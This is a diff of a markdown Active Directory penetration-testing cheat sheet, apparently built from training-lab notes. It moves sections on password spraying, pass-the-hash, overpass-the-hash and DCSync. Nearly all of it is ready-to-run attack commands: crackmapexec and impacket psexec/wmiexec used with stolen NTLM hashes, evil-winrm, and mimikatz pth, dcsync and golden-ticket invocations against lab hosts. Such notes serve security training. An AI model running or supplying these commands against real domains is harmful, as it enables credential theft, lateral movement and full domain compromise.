@@ -106,62 +106,6 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 -    Spray  
      `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
 
-## PASS THE Password and see what other accounts can the password access
-
-         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
-         crackmapexec <ip>/24 -u fcastle -d MARVEL.local -p <password>    
-
-- Remote Access - impacket-psexec  
-```
-psexec.py marvel/fcastle:Password1@192.168.57.142 
-```
-        
-## Pass the Hash (Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached)
-- Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
-```
-crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
-```
-
-- Exploitation to run commands as another user using PTH:
-```
-crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'
-crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
-```
-
-- find which account can the hash access 
-```
-crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
-```
-
-- Remote Access - impacket-psexec  
-```
-impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
-psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
-```
-
-- Remote Access + evil-winrm  
-
-         evil-winrm -i <IP> -u <user> -H <hash>
-
-
-- using wmiexec on kali
-  
-         kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
-
-
-## Over Pass the Hash
-
-- Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
-
-```
-mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
-```
-
-- Command execution with psexec  
-```
-.\PsExec.exe \\<hostname> cmd.exe
-```
 
 # Ticket and Token based
 ## Token Impersonation
@@ -223,7 +167,6 @@ cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
 
 ```
 
-
 ## Golden Ticket - Pass the Ticket (Forge own TGT)
 - It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
 
@@ -245,24 +188,6 @@ whoami /user
 mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
 
 psexec.exe \\dc1 cmd.exe
-```
-
-### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
-```bash
-#output is a kerberos ticket
-mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
-
-# Checking if the forged tickets is in memory
-ps> klist
-
-#get shell
-psexec.exe -accepteula \\<remote_hostname> cmd  
-```
-
-## DCSync Attack
-- The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
-```
-./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
 ## AS-REP roasting
@@ -400,6 +325,85 @@ python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 - leveraging "GenericWrite or GenericAll" permissions, (1) reset the user's password but this may raise suspicion. or (2) set an SPN for the user.
 - kerberoast the account **(same as normal kerberoast)**
 - crack the password hash **(same as normal kerberoast)**
+
+## DCSync Attack
+- The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
+```
+./mimikatz.exe "lsadump::dcsync /user:Administrator"
+```
+
+## PASS THE Password and see what other accounts can the password access
+
+         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
+         crackmapexec <ip>/24 -u fcastle -d MARVEL.local -p <password>    
+
+- Remote Access - impacket-psexec  
+```
+psexec.py marvel/fcastle:Password1@192.168.57.142 
+```
+        
+## Pass the Hash (Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached)
+- Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
+```
+crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
+```
+
+- Exploitation to run commands as another user using PTH:
+```
+crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'
+crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
+```
+
+- find which account can the hash access 
+```
+crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
+```
+
+- Remote Access - impacket-psexec  
+```
+impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
+psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
+```
+
+- Remote Access + evil-winrm  
+
+         evil-winrm -i <IP> -u <user> -H <hash>
+
+
+- using wmiexec on kali
+  
+         kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+
+## Over Pass the Hash
+
+- Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+
+```
+mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
+```
+
+- Command execution with psexec  
+```
+.\PsExec.exe \\<hostname> cmd.exe
+```
+
+### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
+```bash
+#output is a kerberos ticket
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
+# Checking if the forged tickets is in memory
+ps> klist
+
+#get shell
+psexec.exe -accepteula \\<remote_hostname> cmd  
+```
+
+
+
+
 
 # Tools Introduction
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
